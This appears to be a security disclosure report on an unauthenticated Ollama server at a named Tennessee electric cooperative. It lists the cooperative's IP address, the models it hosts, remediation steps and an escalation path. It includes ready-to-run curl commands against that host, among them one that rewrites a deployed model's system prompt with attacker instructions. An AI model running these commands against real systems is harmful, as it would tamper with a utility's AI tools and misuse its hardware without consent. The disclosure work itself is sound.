# Meriwether Lewis Electric Cooperative: 235B-Parameter Model on Unauthenticated Ollama

_NuClide Research · 2026-05-01_

---

## Summary

Meriwether Lewis Electric Cooperative (rural electric utility, Tennessee) running a 235-billion-parameter Ollama instance with raw API port publicly accessible. No authentication. The model inventory, including a 132GB MoE model, indicates significant dedicated GPU infrastructure deployed without basic network security controls.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 66.220.170.90 |
| rDNS | 66.220.170.90.mlec.com |
| Org | Meriwether Lewis Electric Cooperative |
| Sector | **Critical Infrastructure, Electric Utility** |
| Country | US, Tennessee |
| Open ports | 11434 (Ollama, **public**) |

---

## Models

| Model | Size | Notes |
|---|---|---|
| qwen3:235b-a22b | **132 GB** | 235B MoE model, flagship deployment |
| qwen3-vl:32b | 19 GB | Vision-language model |
| qwen2.5:32b | 18 GB | Local |
| llama3.3:70b-instruct-q4_K_M | 39 GB | Local |

Total local model storage: ~208 GB

---

## Findings

### F1: Unauthenticated Ollama API (CRITICAL)

Port 11434 publicly accessible on critical infrastructure operator's network. No authentication.

```bash
curl http://66.220.170.90:11434/api/tags
```

All four models enumerable and injectable without credentials.

### F2: Model Injection on Critical Infrastructure (CRITICAL)

CVE-2025-63389 applies to this instance:

```bash
curl -X POST http://66.220.170.90:11434/api/create \
  -d '{"model":"qwen3:235b-a22b","from":"qwen3:235b-a22b","system":"[attacker prompt]"}'
```

If this model is used for operational decision support or staff workflows, injected instructions affect output on every future invocation.

### F3: 235B MoE Model Accessible to Unauthenticated Actors (HIGH)

`qwen3:235b-a22b` (132GB) represents significant compute accessible without restriction. Any actor can run free inference at the utility's hardware cost. The vision-language model (`qwen3-vl:32b`) could process operational imagery if accessible in the workflow.

---

## Impact

Electric cooperative AI deployment on utility infrastructure with no access control. Classification: **Critical Infrastructure** under CISA ICS-CERT scope (Energy Sector).

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

Firewall rule at network perimeter blocking inbound TCP 11434 as defense-in-depth.

---

## Disclosure

- **Discovered:** 2026-05-01
- **Status:** Pending, CERT/CC VINCE submission recommended (covers class-wide CVE-2025-63389)
- **Escalation path:** CISA ICS-CERT, E-ISAC (Energy sector)
